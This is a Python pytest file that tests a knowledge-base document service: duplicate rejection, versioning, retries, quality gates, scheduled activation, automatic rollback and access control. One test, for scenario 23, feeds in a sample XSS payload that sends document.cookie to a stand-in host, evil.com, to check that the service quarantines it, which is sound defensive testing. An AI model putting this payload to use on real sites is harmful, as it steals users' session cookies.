from datetime import datetime, time, timedelta, timezone
import pytest
from sqlalchemy.future import select

from app.core.clock import Clock
from app.core.dynamic_config import dynamic_config
from app.models.audit import AuditLog
from app.models.knowledge import (
    KnowledgeChunk,
    KnowledgeDeployment,
    KnowledgeDocument,
    KnowledgeQualityTest,
    KnowledgeVersion,
)
from app.models.user import User
from app.services.knowledge.quarantine import quarantine_manager
from app.services.knowledge.quality import quality_evaluator
from app.services.knowledge.retries import retry_manager
from app.services.knowledge.rollback import rollback_manager
from app.services.knowledge.staging import staging_manager


@pytest.fixture(autouse=True)
def reset_system_state():
    Clock.reset()
    dynamic_config.reset_to_defaults()
    yield
    Clock.reset()
    dynamic_config.reset_to_defaults()


async def get_admin_headers(client, email="kb_admin@example.com"):
    await client.post("/api/v1/auth/register", json={
        "email": email,
        "name": "KB Admin",
        "password": "AdminPassword123!",
        "role": "ADMIN"
    })
    login_resp = await client.post("/api/v1/auth/login", json={
        "email": email,
        "password": "AdminPassword123!"
    })
    token = login_resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


async def get_customer_headers(client, email="kb_cust@example.com"):
    await client.post("/api/v1/auth/register", json={
        "email": email,
        "name": "KB Customer",
        "password": "Password123!",
        "role": "CUSTOMER"
    })
    login_resp = await client.post("/api/v1/auth/login", json={
        "email": email,
        "password": "Password123!"
    })
    token = login_resp.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.mark.asyncio
async def test_scenario_21_duplicate_document_detection(client):
    """
    Scenario 21: Detect duplicate documents using SHA-256 content hashes.
    Rejects duplicate documents with HTTP 409 Conflict.
    """
    headers = await get_admin_headers(client, "admin21@example.com")
    content = "Standard Return Policy: Items can be returned within 30 days of purchase with original receipt."

    # Ingest document 1
    res1 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Return Policy Standard",
            "content": content,
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res1.status_code == 201

    # Ingest document 2 with different title but identical content (duplicate!)
    res2 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Returns Copy 2",
            "content": content,
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res2.status_code == 409
    assert "Duplicate document detected" in res2.json()["detail"]


@pytest.mark.asyncio
async def test_scenario_22_modified_vs_unchanged_document(client):
    """
    Scenario 22: Only new or modified documents should be processed.
    Unchanged documents skip re-indexing chunks.
    """
    headers = await get_admin_headers(client, "admin22@example.com")
    content_v1 = "Shipping Policy V1: Standard ground shipping takes 3-5 business days."
    content_v2 = "Shipping Policy V2: Expedited overnight shipping takes 1 business day."

    # Ingest V1
    res1 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Shipping Policy Document",
            "content": content_v1,
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res1.status_code == 201
    assert res1.json()["reprocessed"] is True

    # Re-upload unchanged content V1 -> reprocessing skipped!
    res_unchanged = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Shipping Policy Document",
            "content": content_v1,
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res_unchanged.status_code == 201
    assert res_unchanged.json()["reprocessed"] is False
    assert "reprocessing skipped" in res_unchanged.json()["message"]

    # Upload modified content V2 -> creates updated version and re-indexes
    res_v2 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Shipping Policy Document",
            "content": content_v2,
            "version_int": 2,
            "effective_date": "2026-06-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res_v2.status_code == 201
    assert res_v2.json()["version"] == 2
    assert res_v2.json()["reprocessed"] is True


@pytest.mark.asyncio
async def test_scenario_23_invalid_file_quarantine(client):
    """
    Scenario 23: Invalid or unsafe files must be quarantined.
    Do not process them into the production knowledge base.
    """
    headers = await get_admin_headers(client, "admin23@example.com")
    malicious_content = "Terms of Service: <script>document.location='http://evil.com/steal?c='+document.cookie</script>"

    res = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Injected Terms of Service",
            "content": malicious_content,
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "DRAFT"
        },
        headers=headers
    )
    assert res.status_code == 422
    body = res.json()["detail"]
    assert body["status"] == "QUARANTINED"
    assert any("script detected" in r for r in body["reasons"])


@pytest.mark.asyncio
async def test_scenario_24_to_27_failed_ingestion_and_scheduled_retries(db_session):
    """
    Scenarios 24, 25, 26, 27:
    - Failed ingestion tracking
    - Retry after 15 minutes
    - Retry after 30 minutes
    - Retry after 60 minutes
    - Max retries exceeded -> marks update FAILED with reason
    """
    # Create test document and version
    doc = KnowledgeDocument(
        title="Retry Test Manual",
        content_hash="mock_hash_retry",
        access_level="PUBLIC"
    )
    db_session.add(doc)
    await db_session.flush()

    ver = KnowledgeVersion(
        document_id=doc.id,
        version_int=1,
        effective_date=datetime(2026, 1, 1, tzinfo=timezone.utc),
        expiry_date=datetime(2026, 12, 31, tzinfo=timezone.utc),
        status="DRAFT"
    )
    db_session.add(ver)
    await db_session.flush()

    dep = KnowledgeDeployment(
        version_id=ver.id,
        retry_count=0
    )
    db_session.add(dep)
    await db_session.commit()

    base_time = datetime(2026, 10, 5, 10, 0, tzinfo=timezone.utc)
    Clock.set_time(base_time)

    # Retry 1: 15 minutes
    r1 = await retry_manager.process_failure(db_session, dep.id, reason="Vector service timeout", now=base_time)
    assert r1["status"] == "RETRY_SCHEDULED"
    assert r1["retry_count"] == 1
    assert r1["next_retry_at"] == (base_time + timedelta(minutes=15)).isoformat()

    # Retry 2: 30 minutes
    r2 = await retry_manager.process_failure(db_session, dep.id, reason="Rate limit reached", now=base_time + timedelta(minutes=15))
    assert r2["status"] == "RETRY_SCHEDULED"
    assert r2["retry_count"] == 2
    assert r2["next_retry_at"] == (base_time + timedelta(minutes=15) + timedelta(minutes=30)).isoformat()

    # Retry 3: 60 minutes
    r3 = await retry_manager.process_failure(db_session, dep.id, reason="Connection reset", now=base_time + timedelta(minutes=45))
    assert r3["status"] == "RETRY_SCHEDULED"
    assert r3["retry_count"] == 3
    assert r3["next_retry_at"] == (base_time + timedelta(minutes=45) + timedelta(minutes=60)).isoformat()

    # Retry 4: Exceeded -> mark FAILED
    r4 = await retry_manager.process_failure(db_session, dep.id, reason="Gateway timeout", now=base_time + timedelta(minutes=105))
    assert r4["status"] == "FAILED"
    assert "Max retries exceeded" in r4["reason"]

    await db_session.refresh(ver)
    assert ver.status == "FAILED"


@pytest.mark.asyncio
async def test_scenario_28_quality_evaluation_and_degradation_rejection(client):
    """
    Scenario 28: If an update reduces accuracy or grounding: reject the update.
    Do not activate merely because ingestion succeeded.
    """
    headers = await get_admin_headers(client, "admin28@example.com")

    # Ingest document
    res = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Warranty Policy Quality Test",
            "content": "# Warranty Terms\nComprehensive coverage is provided for 24 months from activation date.",
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "APPROVED"
        },
        headers=headers
    )
    assert res.status_code == 201
    ver_id = res.json()["version_id"]

    # Attempt to deploy with simulated quality degradation
    deploy_res = await client.post(
        f"/api/v1/knowledge/versions/{ver_id}/deploy",
        json={"force": True, "simulated_degradation": True},
        headers=headers
    )
    assert deploy_res.status_code == 200
    body = deploy_res.json()
    assert body["status"] == "REJECTED_QUALITY"
    assert body["grounding_score"] < 0.85
    assert any("below configured minimum threshold" in r for r in body["reasons"])


@pytest.mark.asyncio
async def test_scenario_29_maintenance_window_staged_activation(client):
    """
    Scenario 29: Maintenance-window activation.
    Updates remain staged until the configured window (e.g. 02:00 to 03:00 UTC).
    """
    headers = await get_admin_headers(client, "admin29@example.com")

    # Ingest document
    res = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Nightly Maintenance Update Doc",
            "content": "# Maintenance Policy\nScheduled maintenance occurs strictly during low-traffic windows.",
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "APPROVED"
        },
        headers=headers
    )
    ver_id = res.json()["version_id"]

    # Set clock outside maintenance window: 14:00 (2:00 PM)
    Clock.set_time(datetime(2026, 10, 5, 14, 0, tzinfo=timezone.utc))

    deploy_res = await client.post(
        f"/api/v1/knowledge/versions/{ver_id}/deploy",
        json={"force": False, "simulated_degradation": False},
        headers=headers
    )
    assert deploy_res.status_code == 200
    assert deploy_res.json()["status"] == "SCHEDULED"
    assert "scheduled for next maintenance window" in deploy_res.json()["message"]

    # Advance clock to maintenance window: 02:30 (2:30 AM next day)
    Clock.set_time(datetime(2026, 10, 6, 2, 30, tzinfo=timezone.utc))

    deploy_window_res = await client.post(
        f"/api/v1/knowledge/versions/{ver_id}/deploy",
        json={"force": False, "simulated_degradation": False},
        headers=headers
    )
    assert deploy_window_res.status_code == 200
    assert deploy_window_res.json()["status"] == "ACTIVE"


@pytest.mark.asyncio
async def test_scenario_30_and_31_failed_health_check_and_automatic_rollback(client, db_session):
    """
    Scenarios 30 & 31:
    - Post-activation health check fails within 5 minutes.
    - Automatic rollback restores previous known-good version.
    - Rollback is auditable in AuditLog table.
    """
    headers = await get_admin_headers(client, "admin30@example.com")

    # Ingest Version 1 (Known-good baseline)
    r_v1 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Privacy Compliance Guide",
            "content": "# Privacy Policy V1\nCustomer data is encrypted with AES-256 at rest.",
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "APPROVED"
        },
        headers=headers
    )
    v1_id = r_v1.json()["version_id"]

    # Deploy V1
    dep_v1 = await client.post(
        f"/api/v1/knowledge/versions/{v1_id}/deploy",
        json={"force": True},
        headers=headers
    )
    assert dep_v1.json()["status"] == "ACTIVE"

    # Ingest Version 2 (Faulty update)
    r_v2 = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Privacy Compliance Guide",
            "content": "# Privacy Policy V2\nCustomer data encryption updated with post-quantum algorithms.",
            "version_int": 2,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z",
            "status": "APPROVED"
        },
        headers=headers
    )
    v2_id = r_v2.json()["version_id"]

    # Deploy V2
    dep_v2 = await client.post(
        f"/api/v1/knowledge/versions/{v2_id}/deploy",
        json={"force": True},
        headers=headers
    )
    assert dep_v2.json()["status"] == "ACTIVE"
    dep2_id = dep_v2.json()["deployment_id"]

    # Post-activation health check fails within 5 minutes!
    hc_res = await client.post(
        f"/api/v1/knowledge/deployments/{dep2_id}/health-check",
        json={"simulated_failure": True},
        headers=headers
    )
    assert hc_res.status_code == 200
    hc_body = hc_res.json()
    assert hc_body["status"] == "HEALTH_CHECK_FAILED"
    rollback_info = hc_body["rollback"]
    assert rollback_info["status"] == "ROLLED_BACK"
    assert rollback_info["rolled_back_version_int"] == 2
    assert rollback_info["restored_version_int"] == 1
    assert rollback_info["automatic"] is True

    # Verify Database state & Audit Log
    v1_db = (await db_session.execute(select(KnowledgeVersion).where(KnowledgeVersion.id == v1_id))).scalar_one()
    v2_db = (await db_session.execute(select(KnowledgeVersion).where(KnowledgeVersion.id == v2_id))).scalar_one()

    assert v1_db.status == "ACTIVE"
    assert v2_db.status == "ROLLED_BACK"

    audit_stmt = select(AuditLog).where(
        AuditLog.event_type == "KB_ROLLBACK",
        AuditLog.entity_id == v2_id
    )
    audit = (await db_session.execute(audit_stmt)).scalar_one_or_none()
    assert audit is not None
    assert audit.condition_triggered == "health_check_failure"
    assert audit.details["restored_version"] == 1


@pytest.mark.asyncio
async def test_scenario_32_unauthorized_access_protection(client):
    """
    Scenario 32: Unauthorised access.
    Customers cannot deploy, rollback, or access knowledge management endpoints (HTTP 403 Forbidden).
    """
    headers = await get_customer_headers(client, "cust32@example.com")

    res = await client.post(
        "/api/v1/knowledge/versions/some_ver_id/deploy",
        json={"force": True},
        headers=headers
    )
    assert res.status_code == 403
    assert "Action requires one of the following roles" in res.json()["detail"]

    res_docs = await client.post(
        "/api/v1/knowledge/documents",
        json={
            "title": "Unauthorized Doc",
            "content": "Fake content",
            "version_int": 1,
            "effective_date": "2026-01-01T00:00:00Z",
            "expiry_date": "2026-12-31T23:59:59Z"
        },
        headers=headers
    )
    assert res_docs.status_code == 403
